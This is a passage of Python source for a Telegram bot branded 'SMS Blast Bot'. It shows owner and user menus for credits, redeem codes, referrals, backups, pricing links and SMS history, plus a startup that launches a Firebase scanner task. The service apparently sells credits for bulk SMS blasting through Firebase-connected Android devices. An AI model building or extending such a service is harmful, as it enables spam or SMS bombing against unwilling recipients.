        f"🔗 <code>{rl}</code>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:redeem:menu")]),
        parse_mode="HTML")


@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ none", show_alert=True); return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, "🗑 <b>Delete Code</b>",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save_now(d)
    await cq.answer("🗑 deleted")
    await owner_redeem_menu(cq, state)


@R.callback_query(F.data == "owner:redeem:remove_credits:menu")
async def owner_redeem_remove_credits_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ none", show_alert=True); return
    rows = []
    for code, cd in list(codes.items())[:20]:
        used = len(cd.get("used_by", []))
        rows.append([btn(f"{code} ({used})", f"owner:redeem:rmcredits:confirm:{code}",
                         EMOJI_MONEY, "💸", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message,
        f"💸 <b>Remove Redeem Credits</b>\n\nSelect code:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:redeem:rmcredits:confirm:"))
async def owner_redeem_remove_credits_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    code = cq.data.split("owner:redeem:rmcredits:confirm:", 1)[1]
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await cq.answer("❌ not found", show_alert=True); return
    cd = codes[code]
    used = cd.get("used_by", [])
    cr = cd.get("credits", 0)
    await safe_edit(cq.message,
        f"⚠️ <b>Confirm</b>\n\n🎁 <code>{code}</code>\n"
        f"💰 per user: <b>{cr}</b>\n👥 users: <b>{len(used)}</b>\n\n"
        f"<b>{cr} credits wapas le lega!</b>",
        reply_markup=kb(
            [("✅ ʏᴇs", f"owner:redeem:rmcredits:do:{code}")],
            [("❌ ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]),
        parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:redeem:rmcredits:do:"))
async def owner_redeem_remove_credits_do(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫", show_alert=True); return
    code = cq.data.split("owner:redeem:rmcredits:do:", 1)[1]
    await cq.answer("⏳")
    def _rm(d):
        codes = d.get("redeem_codes", {})
        if code not in codes: return None
        cd = codes[code]
        used = list(cd.get("used_by", []))
        cr = cd.get("credits", 0)
        aff = []
        for u in used:
            k = str(u)
            if k in d.get("users", {}):
                cur = d["users"][k].get("credits", 0)
                nv = max(0, cur - cr)
                dd = cur - nv
                d["users"][k]["credits"] = nv
                if dd > 0: aff.append((u, dd, nv))
        cd["used_by"] = []
        return {"aff": aff, "cr": cr}
    result = atomic_update(_rm)
    if result is None:
        await safe_edit(cq.message, "❌ not found",
                        reply_markup=kb([("ʙᴀᴄᴋ", "owner:redeem:menu")]),
                        parse_mode="HTML"); return
    ok = 0
    for u, dd, nv in result["aff"]:
        try:
            await cq.bot.send_message(u,
                f"⚠️ <b>Credits Adjusted</b>\n\n"
                f"code <code>{code}</code> se mile <b>{dd}</b> wapas liye.\n"
                f"💳 balance: <b>{nv}</b>",
                parse_mode="HTML")
            ok += 1
        except: pass
        await asyncio.sleep(0.05)
    await safe_edit(cq.message,
        f"✅ <b>Removed</b>\n\n🎁 <code>{code}</code>\n"
        f"👥 affected: <b>{len(result['aff'])}</b>\n📨 notified: <b>{ok}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:redeem:menu")]),
        parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# OWNER CREDITS (single)
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await safe_edit(cq.message,
        f"💰 <b>Add Credits</b>\n\nstep 1/2: User ID:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:cat:credits")]),
        parse_mode="HTML")


@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer("❌ valid ID:", parse_mode="HTML"); return
    await state.set_state(S.add_credits_amount)
    await msg.answer("step 2/2: Amount?",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:cat:credits")]),
                    parse_mode="HTML")


@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer("❌ valid number:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    def _a(dd):
        add_credits(uid, amount, dd, is_manual=True)
        return get_user_credits(uid, dd)
    nb = atomic_update(_a)
    await state.clear()
    try:
        await msg.bot.send_message(uid,
            f"💰 <b>Credits Added!</b>\n\n+{amount}\n💳 Balance: <b>{nb}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(
        f"✅ <b>{amount} credits</b> to <code>{uid}</code>\n💳 New: <b>{nb}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:credits")]),
        parse_mode="HTML")


@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await safe_edit(cq.message,
        f"💰 <b>Deduct Credits</b>\n\nstep 1/2: User ID:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:cat:credits")]),
        parse_mode="HTML")


@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer("❌ valid:", parse_mode="HTML"); return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer("step 2/2: Amount?",
                    reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:cat:credits")]),
                    parse_mode="HTML")


@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer("❌ valid:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    ok = deduct_credits(uid, amount, d)
    save_now(d)
    await state.clear()
    if ok:
        try:
            await msg.bot.send_message(uid,
                f"⚠️ <b>Deducted</b>\n\n-{amount}\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML")
        except: pass
        await msg.answer(
            f"✅ <b>{amount} deducted</b>\n💳 New: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:credits")]),
            parse_mode="HTML")
    else:
        await msg.answer(
            f"❌ Insufficient! User has <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:credits")]),
            parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# SETTINGS / ACTIVITY / SMS HISTORY
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    s = d.get("settings", {})
    text = (
        f"⚙️ <b>Bot Settings</b>\n\n"
        f"🎁 Referral Credits: <b>{s.get('ref_credits', 3)}</b>\n"
        f"👑 Max Owners: <b>{s.get('max_owners', 6)}</b>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.set_ref_credits)
    await safe_edit(cq.message,
        f"🎁 <b>Set Referral Credits</b>\n\nAmount per referral?",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:settings")]),
        parse_mode="HTML")


@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        cr = int(msg.text.strip())
        if cr < 0: raise ValueError
    except:
        await msg.answer("❌ valid number:", parse_mode="HTML"); return
    d.setdefault("settings", {})["ref_credits"] = cr
    d["premium"]["ref_credits"] = cr
    save_now(d)
    await state.clear()
    await msg.answer(f"✅ <b>Updated!</b>\nNow <b>{cr}</b> credits per referral.",
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:settings")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    entries = d.get("activity_log", [])[-20:]
    if not entries:
        text = "📜 <b>Activity Log</b>\n\n<i>empty</i>"
    else:
        lines = ["📜 <b>Activity Log</b>\n"]
        for e in reversed(entries):
            lines.append(f"[{fmt_time(e.get('timestamp', 0))}] "
                        f"<code>{e.get('uid', 0)}</code> — "
                        f"<b>{escape(e.get('action', '?'))}</b> — "
                        f"{escape(e.get('details', '')[:40])}")
        text = "\n".join(lines)
    await safe_edit(cq.message, text,
                    reply_markup=kb([
                        ("🔄 ʀᴇғʀᴇsʜ", "owner:activity"),
                        ("ʙᴀᴄᴋ", "owner:cat:system")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    all_hist = d.get("sms_history", {})
    total = sum(len(v) for v in all_hist.values())
    text = (f"📋 <b>Global SMS History</b>\n\nTotal records: <b>{total}</b>\n\n"
            f"<i>Per-user history user detail se dekhein.</i>")
    await safe_edit(cq.message, text,
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:system")]),
                    parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# BACKUP UI
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:backup:menu")
async def backup_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await safe_edit(cq.message, backup_panel_text(d),
                    reply_markup=backup_panel_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "bk:setchat")
async def backup_setchat_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.backup_chat)
    await safe_edit(cq.message,
        f"🎯 <b>Set Backup Chat</b>\n\n"
        f"Private GC chat_id bhejo (<code>-100...</code>):\n\n"
        f"<i>Ya /setbackup_here us GC mein bhejo.</i>",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:backup:menu")]),
        parse_mode="HTML")


@R.message(S.backup_chat)
async def backup_setchat_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        cid = int(msg.text.strip())
    except:
        await msg.answer("❌ valid chat_id:", parse_mode="HTML"); return
    title = str(cid)
    try:
        c = await msg.bot.get_chat(cid)
        title = c.title or c.full_name or str(cid)
    except Exception as e:
        await msg.answer(f"⚠️ chat accessible nahi: <code>{escape(str(e))}</code>",
                        parse_mode="HTML"); return
    def _s(dd):
        cfg = dd.setdefault("backup", {})
        cfg["chat_id"] = cid
        cfg["chat_title"] = title
    atomic_update(_s)
    await state.clear()
    await msg.answer(f"✅ target: <b>{escape(title)}</b>",
                    reply_markup=backup_panel_kb(load()), parse_mode="HTML")


@R.message(Command("setbackup_here"))
async def backup_set_here(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await msg.answer("🚫 owner only"); return
    chat = msg.chat
    if chat.type not in ("group", "supergroup", "channel"):
        await msg.answer("❌ ye command sirf group/channel mein chalti hai"); return
    def _s(dd):
        cfg = dd.setdefault("backup", {})
        cfg["chat_id"] = chat.id
        cfg["chat_title"] = chat.title or str(chat.id)
    atomic_update(_s)
    await msg.answer(
        f"✅ is GC ko backup target set kiya:\n<b>{escape(chat.title or str(chat.id))}</b>\n"
        f"<code>{chat.id}</code>",
        reply_markup=backup_panel_kb(load()), parse_mode="HTML")


@R.callback_query(F.data == "bk:settimes")
async def backup_settimes_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.backup_times)
    await safe_edit(cq.message,
        f"⏰ <b>Set Backup Times</b>\n\n"
        f"24h format, comma-separated:\n"
        f"<code>03:00,15:00,21:30</code>\n\n"
        f"Khali bhejo to clear.",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:backup:menu")]),
        parse_mode="HTML")


@R.message(S.backup_times)
async def backup_settimes_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    raw = msg.text.strip()
    times = []
    if raw:
        for part in raw.split(","):
            part = part.strip()
            try:
                hh, mm = part.split(":")
                hi, mi = int(hh), int(mm)
                if 0 <= hi < 24 and 0 <= mi < 60:
                    times.append(f"{hi:02d}:{mi:02d}")
            except:
                await msg.answer(f"❌ invalid time: <code>{escape(part)}</code>",
                                parse_mode="HTML"); return
    def _s(dd):
        dd.setdefault("backup", {})["times"] = sorted(set(times))
    atomic_update(_s)
    await state.clear()
    await msg.answer(f"✅ times set: <b>{', '.join(times) if times else '—'}</b>",
                    reply_markup=backup_panel_kb(load()), parse_mode="HTML")


@R.callback_query(F.data.in_({"bk:toggle:on", "bk:toggle:off"}))
async def backup_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    cfg = d.get("backup", {})
    want = cq.data.endswith(":on")
    if want and (not cfg.get("chat_id") or not cfg.get("times")):
        await cq.answer("❌ pehle chat + times set karo", show_alert=True); return
    def _s(dd):
        dd.setdefault("backup", {})["enabled"] = want
    atomic_update(_s)
    await cq.answer("🟢 enabled" if want else "🔴 disabled")
    await backup_menu(cq, state)


@R.callback_query(F.data == "bk:now")
async def backup_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("💾 sending...")
    ok, msg = await do_backup_send(cq.bot, manual=True)
    await cq.answer("✅ sent" if ok else f"❌ {msg}", show_alert=True)
    await backup_menu(cq, state)


@R.callback_query(F.data == "bk:history")
async def backup_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    hist = d.get("backup", {}).get("history", [])[-15:]
    if not hist:
        text = "📜 <b>Backup History</b>\n\n<i>none</i>"
    else:
        lines = [f"📜 <b>Backup History</b> (last {len(hist)})\n"]
        for h in reversed(hist):
            icon = "✅" if h["ok"] else "❌"
            lines.append(f"{icon} {fmt_time(h['ts'])} · {_human_bytes(h['bytes'])}"
                        + (f" · <i>{escape(h['err'][:40])}</i>" if h.get("err") else ""))
        text = "\n".join(lines)
    await safe_edit(cq.message, text,
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:backup:menu")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "bk:clean")
async def backup_clean(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    removed = 0
    if os.path.isdir("backups"):
        for f in os.listdir("backups"):
            try:
                os.remove(os.path.join("backups", f)); removed += 1
            except: pass
    await cq.answer(f"🗑 removed {removed}", show_alert=True)
    await backup_menu(cq, state)


# ═══════════════════════════════════════════════════════════════════════
# MONITORING
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"mon:refresh", "owner:monitoring"}))
async def monitoring_panel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await safe_edit(cq.message, monitoring_text(d),
                    reply_markup=monitoring_kb(), parse_mode="HTML")


@R.callback_query(F.data == "mon:dau")
async def monitoring_dau(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    lg = d.get("dau_log", {})
    days = []
    for i in range(13, -1, -1):
        dt = datetime.now() - timedelta(days=i)
        key = dt.strftime("%Y-%m-%d")
        days.append((key, lg.get(key, 0)))
    peak = max((v for _, v in days), default=1) or 1
    lines = ["📈 <b>DAU — last 14 days</b>\n"]
    for key, val in days:
        bar = "█" * int((val / peak) * 12) if val else "·"
        lines.append(f"<code>{key[5:]}</code>  {bar}  <b>{val}</b>")
    await safe_edit(cq.message, "\n".join(lines),
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:monitoring")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "mon:top")
async def monitoring_top(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    users = d.get("users", {})
    top = sorted(users.items(), key=lambda kv: kv[1].get("uses", 0), reverse=True)[:15]
    lines = ["🏆 <b>Top 15 users</b>\n"]
    for i, (us, u) in enumerate(top, 1):
        if u.get("uses", 0) == 0: break
        lines.append(f"{i}. <code>{us}</code> · {escape(u.get('name', '?')[:16])}\n"
                    f"    📤 {u.get('uses', 0)}  ·  💰 {u.get('credits', 0)}")
    if len(lines) == 1:
        lines.append("<i>none</i>")
    await safe_edit(cq.message, "\n".join(lines),
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:monitoring")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "mon:storage")
async def monitoring_storage(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    s = get_storage_stats()
    txt = (
        f"📦 <b>Storage</b>\n\n"
        f"🗄 db: <b>{_human_bytes(s['data'])}</b>\n"
        f"💾 local: <b>{_human_bytes(s['backup'])}</b> ({s['backup_count']} files)\n"
        f"📊 total: <b>{_human_bytes(s['total'])}</b>\n\n"
        f"<i>local backups rolling (max 7).</i>"
    )
    await safe_edit(cq.message, txt,
                    reply_markup=kb(
                        [("🗑 ᴄʟᴇᴀɴ", "bk:clean")],
                        [("ʙᴀᴄᴋ", "owner:monitoring")]),
                    parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# USER HOME / REDEEM / REFER / STATS / HISTORY / PRICING / INFO
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load(); uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_edit(cq.message, force_join_text(missing),
                        reply_markup=force_join_kb(missing),
                        parse_mode="HTML", disable_web_page_preview=True)
        return
    if is_owner(uid, d):
        await safe_edit(cq.message, owner_panel_text(d),
                        reply_markup=owner_home_kb_v2(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await safe_edit(cq.message, admin_panel_text(d),
                        reply_markup=admin_home_kb_v2(d), parse_mode="HTML"); return
    if not can_use(uid, d):
        await safe_edit(cq.message, no_access_text(uid, d), parse_mode="HTML"); return
    await safe_edit(cq.message, user_home_text_v2(uid, d),
                    reply_markup=user_kb(), parse_mode="HTML")


@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    cr = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {cr}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)


@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await safe_edit(cq.message,
        f"🎁 <b>Redeem Code</b>\n\nEnter code:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML")


@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code = msg.text.strip()
    await state.clear()
    st, cr = do_redeem_code(uid, code)
    if st == "invalid":
        await msg.answer("❌ Invalid code!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML"); return
    if st == "expired":
        await msg.answer("❌ Expired!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML"); return
    if st == "used":
        await msg.answer("❌ Already used!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML"); return
    d = load()
    await msg.answer(
        f"🎉 <b>Redeem Successful!</b>\n\n💰 +{cr} credits!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]),
        parse_mode="HTML")


@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save_now(d)
    rc = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await safe_edit(cq.message,
        f"👥 <b>Referral</b>\n\n"
        f"Har successful referral pe <b>{rc}</b> credits!\n\n"
        f"🎁 Your code: <code>{code}</code>\n\n"
        f"🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML")


@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    u = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await safe_edit(cq.message,
        f"📊 <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{u.get('credits', 0)}</b>\n"
        f"📤 SMS Sent: <b>{u.get('uses', 0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(u.get('joined_at', 0))}</b>\n\n"
        f"📈 Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML")


@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    hist = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not hist:
        text = "📜 <b>Your SMS History</b>\n\n<i>none</i>"
    else:
        lines = [f"📜 <b>Your SMS History</b> (last {len(hist)})\n"]
        for i, e in enumerate(reversed(hist), 1):
            icon = "✅" if e.get("status") == "sent" else "🛑" if e.get("status") == "stopped" else "⏳"
            lines.append(f"{i}. [{fmt_time(e.get('timestamp', 0))}] {icon} "
                        f"<code>{mask_number(e.get('number', '?'))}</code>")
        text = "\n".join(lines)
    await safe_edit(cq.message, text,
                    reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ koi plan nahi", show_alert=True); return
    text = "💰 <b>Buy Credits</b>\n\n"
    for p in plans:
        text += (f"📋 <b>{escape(p['name'])}</b>\n"
                f"   💰 {p['price']} {p.get('currency', 'INR')}\n"
                f"   🎁 {p['credits']} credits\n\n")
    rows = []
    for p in plans:
        rows.append([btn_url(f"Buy {sc(p['name'][:20])}", p['payment_link'],
                             EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await safe_edit(cq.message,
        f"ℹ️ <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"🤖 Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"👤 Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"💬 Support: Contact owner\n\n"
        f"<i>Credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML", disable_web_page_preview=True)


@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()


# ═══════════════════════════════════════════════════════════════════════
# /logs (owner compact export)
# ═══════════════════════════════════════════════════════════════════════
@R.message(Command("logs"))
async def cmd_logs(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_owner(uid, d):
        await msg.answer("❌ owner only", parse_mode="HTML"); return
    wait = await msg.answer(f"{em(EMOJI_GEAR, '⏳')} Generating...", parse_mode="HTML")
    lines = ["=" * 60,
             "  SMS BLAST BOT - COMPACT LOG",
             f"  by: {uid} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             "=" * 60, ""]
    users = d.get("users", {})
    fj = d.get("force_join", {})
    chans = fj.get("channels", [])
    lines.append("[FORCE JOIN]")
    lines.append(f"enabled: {fj.get('enabled', False)} | chans: {len(chans)}")
    for ch in chans:
        lines.append(f"  - {ch.get('title', '?')} ({ch.get('id')})")
    lines.append("")
    fjm = []
    if fj.get("enabled") and chans:
        for us in users:
            try: tu = int(us)
            except: continue
            ok_all = True; joined = []
            for ch in chans:
                if not ch.get("required", True): continue
                if await check_membership(msg.bot, tu, ch["id"]):
                    joined.append(ch.get("title", "?"))
                else: ok_all = False
            if joined:
                u = users[us]
                fjm.append(f"  {us} | {u.get('name', '?')} | "
                          f"{', '.join(joined)}{' (ALL)' if ok_all else ' (PARTIAL)'}")
            await asyncio.sleep(0.05)
    lines.append(f"[FJ MEMBERS] {len(fjm)}")
    lines.extend(fjm or ["  (none)"])
    lines.append("")
    ml = []
    for us, u in users.items():
        m = u.get("manual_added_credits", 0)
        if m > 0:
            ml.append(f"  {us} | {u.get('name', '?')} | manual: {m} | balance: {u.get('credits', 0)}")
    lines.append(f"[MANUAL CREDITED] {len(ml)}")
    lines.extend(ml or ["  (none)"])
    lines.append("")
    lines.append("=" * 60)
    lines.append("  END")
    lines.append("=" * 60)
    txt = "\n".join(lines)
    buf = io.BytesIO(txt.encode("utf-8"))
    fname = f"compact_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try: await wait.delete()
    except: pass
    await msg.answer_document(
        document=BufferedInputFile(buf.getvalue(), filename=fname),
        caption=(f"{em(EMOJI_GEAR, '📜')} <b>Log Export</b>\n"
                f"✅ FJ members: <b>{len(fjm)}</b>\n"
                f"💰 manual credits: <b>{len(ml)}</b>\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"),
        parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    global _BACKUP_TASK
    _BACKUP_TASK = asyncio.create_task(backup_scheduler(bot))
    log.info("Background tasks created: scanner + backup")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n"
            f"@{me.username}\n<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} <b>Scanner:</b> starting...\n"
            f"💾 <b>Auto Backup:</b> scheduler active\n"
